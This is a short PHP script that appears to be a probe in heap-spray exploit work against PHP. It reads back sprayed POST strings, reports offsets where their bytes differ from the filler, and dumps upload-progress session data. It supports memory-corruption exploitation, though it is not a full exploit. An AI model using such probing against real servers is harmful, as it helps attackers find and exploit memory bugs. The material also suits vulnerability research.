<?php
// Probe readback: find any t[] string whose bytes differ from the spray filler.
session_start();
header('Content-Type: text/plain; charset=binary');
echo "SID=" . session_id() . " NPOST=" . count($_POST) . "\n";
if (isset($_POST['t'])) {
    $base = null;
    foreach ($_POST['t'] as $i => $v) {
        if ($base === null && strlen($v) > 100) { $base = $v; continue; }
        if (strlen($v) !== strlen($base ?? '')) { echo "LEN-DIFF t[$i] len=" . strlen($v) . "\n"; continue; }
        $d = $v ^ $base;
        if ($d !== str_repeat("\x00", strlen($d))) {
            $offs = [];
            for ($j = 0; $j < strlen($d); $j++) if ($d[$j] !== "\x00") $offs[] = $j;
            echo "DIFF t[$i] valoff=[" . min($offs) . ".." . max($offs) . "] chunkoff=[" . (min($offs)+24) . ".." . (max($offs)+24) . "] hex@" . min($offs) . "=" . bin2hex(substr($v, min($offs), 16)) . "\n";
        }
    }
    echo "BASELEN=" . strlen($base ?? '') . "\n";
}
$k = 'upload_progress_' . ($_GET['k'] ?? 'x');
if (isset($_SESSION[$k])) {
    echo "PROGRESS=" . var_export($_SESSION[$k], true) . "\n";
} else {
    echo "NOPROGRESS keys=" . json_encode(array_keys($_SESSION)) . "\n";
}
